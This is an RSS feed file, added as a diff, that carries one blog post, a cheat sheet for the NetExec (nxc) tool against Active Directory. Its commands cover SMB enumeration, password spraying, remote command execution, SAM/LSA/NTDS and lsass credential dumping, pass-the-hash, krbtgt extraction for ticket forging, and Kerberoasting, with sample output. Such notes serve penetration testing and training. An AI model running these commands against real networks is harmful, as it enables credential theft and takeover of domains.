@@ -1,0 +1,270 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Active Directory on 0000FF</title><link>https://simonefelici.github.io/categories/active-directory/</link><description>Recent content in Active Directory on 0000FF</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 22 Jan 2024 10:00:00 +0100</lastBuildDate><atom:link href="https://simonefelici.github.io/categories/active-directory/index.xml" rel="self" type="application/rss+xml"/><item><title>NetExec Tool Overview</title><link>https://simonefelici.github.io/p/netexec-tool-overview/</link><pubDate>Mon, 22 Jan 2024 10:00:00 +0100</pubDate><guid>https://simonefelici.github.io/p/netexec-tool-overview/</guid><description>&lt;img src="https://cloud.githubusercontent.com/assets/5151193/17577511/d312ceb4-5f3b-11e6-8de5-8822246289fd.jpg" alt="Featured image of post NetExec Tool Overview" />&lt;p>Enumeration:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nxc smb -h
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nxc smb &amp;lt;URL&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB &amp;lt;URL&amp;gt; &lt;span class="m">445&lt;/span> DC-DC &lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Windows 10.0 Build &lt;span class="m">20348&lt;/span> x64 &lt;span class="o">(&lt;/span>name: DC-DC&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>domain: dc.local&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>signing: True&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>SMBv1:False&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Name: PC’s name&lt;/p>
+&lt;p>domain: domain’s name&lt;/p>
+&lt;p>SMBv1:True (Possible Eternal Blue exploit)&lt;/p>
+&lt;p>Check for acounts:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nxc smb &amp;lt;URL&amp;gt; -u &lt;span class="s1">&amp;#39;guest&amp;#39;&lt;/span> -p &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB &amp;lt;URL&amp;gt; &lt;span class="m">445&lt;/span> DC-DC &lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Windows 10.0 Build &lt;span class="m">20348&lt;/span> x64 &lt;span class="o">(&lt;/span>name: DC-DC&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>domain: dc.local&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>signing: True&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>SMBv1:False&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB &amp;lt;URL&amp;gt; &lt;span class="m">445&lt;/span> DC-DC &lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> dc.local&lt;span class="se">\g&lt;/span>uest: STATUS_ACCOUNT_DISABLED
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>With a file:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nxc smb &amp;lt;URL&amp;gt; -u &lt;span class="s1">&amp;#39;usern.name&amp;#39;&lt;/span> -p &lt;span class="s1">&amp;#39;password_file.txt&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">SMB &amp;lt;URL&amp;gt; &lt;span class="m">445&lt;/span> DC-DC &lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Windows 10.0 Build &lt;span class="m">20348&lt;/span> x64 &lt;span class="o">(&lt;/span>name: DC-DC&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>domain: dc. &lt;span class="nb">local&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>signing:True&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>SMBv1:False&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB &amp;lt;URL&amp;gt; &lt;span class="m">445&lt;/span> DC-DC &lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> dc.local&lt;span class="se">\n&lt;/span>ame.surname:password STATUS_LOGON_FAILURE
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB &amp;lt;URL&amp;gt; &lt;span class="m">445&lt;/span> DC-DC &lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> dc.local&lt;span class="se">\n&lt;/span>ame.surname:Password123 STATUS_LOGON_FAILURE
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB &amp;lt;URL&amp;gt; &lt;span class="m">445&lt;/span> DC-DC &lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> dc.local&lt;span class="se">\n&lt;/span>ame.surname:Summer2023! STATUS_LOGON_FAILURE
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB &amp;lt;URL&amp;gt; &lt;span class="m">445&lt;/span> DC-DC &lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> dc. local&lt;span class="se">\n&lt;/span>ame.surname:SeekTheCheapestRoute!
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Pass the password:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nxc smb &amp;lt;URL&amp;gt; -u &lt;span class="s1">&amp;#39;user_file.txt&amp;#39;&lt;/span> -p &lt;span class="s1">&amp;#39;&amp;lt;found_password&amp;gt;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>With credentials: (enumerate users and groups)&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nxc smb &amp;lt;URL&amp;gt; -u &lt;span class="s1">&amp;#39;user.name&amp;#39;&lt;/span> -p &lt;span class="s1">&amp;#39;found_password&amp;#39;&lt;/span> --rid-brute
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>With&lt;code>--log&lt;/code> you can log a specific command to a specific file&lt;/p>
+&lt;p>config file:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">/home/kali/.nxc/nxc.conf
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>nxc&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">workspace&lt;/span> &lt;span class="o">=&lt;/span> default
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">last_used_db&lt;/span> &lt;span class="o">=&lt;/span> smb
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">pwn3d_label&lt;/span> &lt;span class="o">=&lt;/span> Pwn3d!
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">audit_mode&lt;/span> &lt;span class="o">=&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">reveal_chars_of_pwd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="m">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">log_mode&lt;/span> &lt;span class="o">=&lt;/span> False &amp;lt;--- &lt;span class="k">if&lt;/span> True generates log in the &lt;span class="s2">&amp;#34;/home/kali/.nxc/logs&amp;#34;&lt;/span> folder
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">ignore_opsec&lt;/span> &lt;span class="o">=&lt;/span> True
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">host_info_colors&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">[&lt;/span>&lt;span class="s2">&amp;#34;green&amp;#34;&lt;/span>, &lt;span class="s2">&amp;#34;red&amp;#34;&lt;/span>, &lt;span class="s2">&amp;#34;yellow&amp;#34;&lt;/span>, &lt;span class="s2">&amp;#34;cyan&amp;#34;&lt;/span>&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>BloodHound&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">bh_enabled&lt;/span> &lt;span class="o">=&lt;/span> False
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">bh_uri&lt;/span> &lt;span class="o">=&lt;/span> 127.0.0.1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">bh_port&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="m">7687&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">bh_user&lt;/span> &lt;span class="o">=&lt;/span> neo4j
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">bh_pass&lt;/span> &lt;span class="o">=&lt;/span> neo4j
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>Empire&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">api_host&lt;/span> &lt;span class="o">=&lt;/span> 127.0.0.1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">api_port&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="m">1337&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">username&lt;/span> &lt;span class="o">=&lt;/span> empireadmin
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">password&lt;/span> &lt;span class="o">=&lt;/span> password123
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>Metasploit&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">rpc_host&lt;/span> &lt;span class="o">=&lt;/span> 127.0.0.1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">rpc_port&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="m">55552&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">password&lt;/span> &lt;span class="o">=&lt;/span> abc123
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Kerberos Auth:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nxc smb &amp;lt;URL&amp;gt; -u &lt;span class="s1">&amp;#39;user.name&amp;#39;&lt;/span> -p &lt;span class="s1">&amp;#39;found_password&amp;#39;&lt;/span> -k
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>If you have a tgt ticket:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">export&lt;/span> &lt;span class="nv">KRB5CCNAME&lt;/span>&lt;span class="o">=&lt;/span>ticket.ccache
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nxc smb &amp;lt;URL&amp;gt; -u &lt;span class="s1">&amp;#39;user.name&amp;#39;&lt;/span> -p &lt;span class="s1">&amp;#39;found_password&amp;#39;&lt;/span> --use-kcache
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Execute commands:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nxc smb &amp;lt;URL&amp;gt; -u &lt;span class="s1">&amp;#39;user.name&amp;#39;&lt;/span> -p &lt;span class="s1">&amp;#39;found_password&amp;#39;&lt;/span> -x &lt;span class="s1">&amp;#39;command&amp;#39;&lt;/span> &amp;lt;--- cmd
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nxc smb &amp;lt;URL&amp;gt; -u &lt;span class="s1">&amp;#39;user.name&amp;#39;&lt;/span> -p &lt;span class="s1">&amp;#39;found_password&amp;#39;&lt;/span> -X &lt;span class="s1">&amp;#39;command&amp;#39;&lt;/span> &amp;lt;--- Powershell
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nxc smb &amp;lt;URL&amp;gt; -u &lt;span class="s1">&amp;#39;user.name&amp;#39;&lt;/span> -p &lt;span class="s1">&amp;#39;found_password&amp;#39;&lt;/span> -x &lt;span class="s1">&amp;#39;powershell.exe -c &amp;#34;GCI C:\\&amp;#34;&amp;#39;&lt;/span> &amp;lt;--- Powershell without obfuscation
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>If you got admin the first thing to do is dump the sam/lsa:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nxc smb &amp;lt;URL&amp;gt; -u &lt;span class="s1">&amp;#39;Administrator&amp;#39;&lt;/span> -p &lt;span class="s1">&amp;#39;admin_pass&amp;#39;&lt;/span> --sam
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nxc smb &amp;lt;URL&amp;gt; -u &lt;span class="s1">&amp;#39;Administrator&amp;#39;&lt;/span> -p &lt;span class="s1">&amp;#39;admin_pass&amp;#39;&lt;/span> --lsa
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Auth with Hash:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nxc smb &amp;lt;URL&amp;gt; -u &lt;span class="s1">&amp;#39;USER-DC$&amp;#39;&lt;/span> -H &amp;lt;hash&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>PC name needed.&lt;/p>
+&lt;p>ntds dump:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nxc smb &amp;lt;URL&amp;gt; -u &lt;span class="s1">&amp;#39;USER-DC$&amp;#39;&lt;/span> -H &amp;lt;hash&amp;gt; --ntds
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>ntds dump of a single user: (better krbtgt)&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nxc smb &amp;lt;URL&amp;gt; -u &lt;span class="s1">&amp;#39;USER-DC$&amp;#39;&lt;/span> -H &amp;lt;hash&amp;gt; --ntds --user krbtgt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>With the hash of the krbtgt we can forge our own tickets.&lt;/p>
+&lt;p>Modules:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nxc smb &amp;lt;URL&amp;gt; -u &lt;span class="s1">&amp;#39;Administrator&amp;#39;&lt;/span> -p &lt;span class="s1">&amp;#39;admin_pass&amp;#39;&lt;/span> -M nanodump
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Get lsass dump and parse the result with pypykatz&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nxc smb &amp;lt;URL&amp;gt; -u &lt;span class="s1">&amp;#39;Administrator&amp;#39;&lt;/span> -p &lt;span class="s1">&amp;#39;admin_pass&amp;#39;&lt;/span> -M lsassy
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Dumps lsass and parse the result remotely with lsassy&lt;/p>
+&lt;p>Put files in the smb share:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nxc smb &amp;lt;URL&amp;gt; -u &lt;span class="s1">&amp;#39;Administrator&amp;#39;&lt;/span> -p &lt;span class="s1">&amp;#39;admin_pass&amp;#39;&lt;/span> --put-file file.txt &lt;span class="s1">&amp;#39;\\file.txt&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="ldap">LDAP
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nxc ldap -L &amp;lt;--list modules
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Kerberoast:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nxc ldap &amp;lt;URL&amp;gt; -u &lt;span class="s1">&amp;#39;Administrator&amp;#39;&lt;/span> -p &lt;span class="s1">&amp;#39;admin_pass&amp;#39;&lt;/span> --kerberoasting outfile.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div></description></item></channel></rss>
